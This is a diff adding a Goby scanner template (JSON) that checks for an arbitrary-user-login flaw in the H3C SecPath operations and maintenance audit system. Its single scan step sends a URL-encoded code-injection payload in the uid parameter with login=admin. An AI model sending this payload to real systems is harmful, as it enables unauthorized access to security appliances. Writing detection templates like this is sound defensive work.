@@ -1,0 +1,66 @@
+{
+  "Name": "H3C SECPATH Operations and Maintenance Audit System",
+  "Description": "H3C-SECPATH - Operations and Maintenance Audit System Arbitrary user login",
+  "Product": "",
+  "Homepage": "h3c.com",
+  "DisclosureDate": "2021-04-18",
+  "Author": "kio",
+  "GobyQuery": "app=\"H3C-SecPath-Operation-and-maintenance-audit-system\"",
+  "Level": "3",
+  "Impact": "<p>H3C-SECPATH - Operations and Maintenance Audit System Arbitrary user login<br></p>",
+  "Recommandation": "",
+  "References": [
+    "https://gobies.org/"
+  ],
+  "HasExp": false,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "错误的id",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["Unauthorized access"],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["H3C-SecPath-Operation-and-maintenance-audit-system"]
+  }
+}
